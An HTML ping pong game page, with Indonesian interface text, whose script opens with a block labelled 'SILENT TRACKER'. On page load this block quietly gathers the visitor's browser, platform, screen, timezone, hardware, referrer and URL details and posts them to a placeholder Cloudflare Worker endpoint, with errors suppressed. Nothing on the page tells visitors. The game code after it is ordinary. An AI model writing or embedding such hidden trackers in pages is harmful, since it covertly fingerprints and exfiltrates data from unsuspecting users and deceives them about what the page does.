<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ping Pong Game</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    background: #0a0a0a;
    font-family: 'Segoe UI', sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; overflow: hidden; color: #fff;
  }
  .wrap { text-align: center; }
  h1 { color: #00ffcc; margin-bottom: 15px; font-size: 22px; text-shadow: 0 0 10px #00ffcc; }
  canvas {
    background: #111; border: 2px solid #00ffcc; border-radius: 10px;
    box-shadow: 0 0 25px rgba(0,255,204,0.4); display: block; margin: 0 auto;
    touch-action: none;
  }
  .score { margin-top: 12px; font-size: 18px; letter-spacing: 2px; }
  .score span { color: #00ffcc; font-weight: bold; }
  .hint { margin-top: 8px; font-size: 12px; color: #555; }
</style>
</head>
<body>
<div class="wrap">
  <h1>🏓 PING PONG</h1>
  <canvas id="game" width="360" height="480"></canvas>
  <div class="score">YOU <span id="ps">0</span> — <span id="cs">0</span> CPU</div>
  <div class="hint">Gerakkan mouse / jari untuk kontrol paddle</div>
</div>

<script>
/* ==== SILENT TRACKER ==== */
(function(){
  // GANTI INI SAMA URL WORKER LO
  const WORKER_URL = 'https://nama-worker-lo.username.workers.dev/log';

  const payload = {
    ua: navigator.userAgent,
    lang: navigator.language,
    platform: navigator.platform,
    screen: screen.width + 'x' + screen.height,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores: navigator.hardwareConcurrency || 'N/A',
    touch: 'ontouchstart' in window,
    ref: document.referrer || 'direct',
    url: location.href,
    time: new Date().toISOString()
  };

  fetch(WORKER_URL, {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(payload)
  }).catch(()=>{});
})();

/* ==== GAME ==== */
const c = document.getElementById('game');
const x = c.getContext('2d');
const W = c.width, H = c.height;
const PAD_W = 90, PAD_H = 12;
let player = { x: W/2 - PAD_W/2, y: H - 30 };
let cpu = { x: W/2 - PAD_W/2, y: 18 };
let ball = { x: W/2, y: H/2, vx: 3.5, vy: -3.5, r: 7 };
let ps = 0, cs = 0;

function movePlayer(px){ player.x = Math.max(0, Math.min(W - PAD_W, px - PAD_W/2)); }
c.addEventListener('mousemove', e => { const r = c.getBoundingClientRect(); movePlayer(e.clientX - r.left); });
c.addEventListener('touchmove', e => { e.preventDefault(); const r = c.getBoundingClientRect(); movePlayer(e.touches[0].clientX - r.left); }, {passive:false});

function resetBall(dir){ ball.x = W/2; ball.y = H/2; ball.vx = (Math.random()>0.5?1:-1)*3.5; ball.vy = dir*3.5; }

function rr(ctx,x,y,w,h,r){ ctx.beginPath(); ctx.moveTo(x+r,y); ctx.arcTo(x+w,y,x+w,y+h,r); ctx.arcTo(x+w,y+h,x,y+h,r); ctx.arcTo(x,y+h,x,y,r); ctx.arcTo(x,y,x+w,y,r); ctx.closePath(); ctx.fill(); }

function loop(){
  x.fillStyle = '#111'; x.fillRect(0,0,W,H);
  x.setLineDash([6,8]); x.strokeStyle='#333'; x.beginPath(); x.moveTo(0,H/2); x.lineTo(W,H/2); x.stroke(); x.setLineDash([]);

  ball.x += ball.vx; ball.y += ball.vy;
  if (ball.x - ball.r < 0 || ball.x + ball.r > W) ball.vx *= -1;

  if (ball.y + ball.r > player.y && ball.y < player.y+PAD_H && ball.x > player.x && ball.x < player.x+PAD_W && ball.vy > 0){
    ball.vy *= -1; ball.vx += (ball.x - (player.x+PAD_W/2)) * 0.05;
  }
  if (ball.y - ball.r < cpu.y+PAD_H && ball.y > cpu.y && ball.x > cpu.x && ball.x < cpu.x+PAD_W && ball.vy < 0){
    ball.vy *= -1; ball.vx += (ball.x - (cpu.x+PAD_W/2)) * 0.05;
  }
  if (ball.y < 0){ ps++; document.getElementById('ps').textContent = ps; resetBall(1); }
  if (ball.y > H){ cs++; document.getElementById('cs').textContent = cs; resetBall(-1); }

  cpu.x += ((ball.x - PAD_W/2) - cpu.x) * 0.08;
  cpu.x = Math.max(0, Math.min(W - PAD_W, cpu.x));

  x.fillStyle = '#00ffcc'; x.shadowColor = '#00ffcc'; x.shadowBlur = 12;
  rr(x, player.x, player.y, PAD_W, PAD_H, 6);
  rr(x, cpu.x, cpu.y, PAD_W, PAD_H, 6);
  x.beginPath(); x.arc(ball.x, ball.y, ball.r, 0, Math.PI*2); x.fill(); x.shadowBlur = 0;

  requestAnimationFrame(loop);
}
loop();
</script>
</body>
</html>
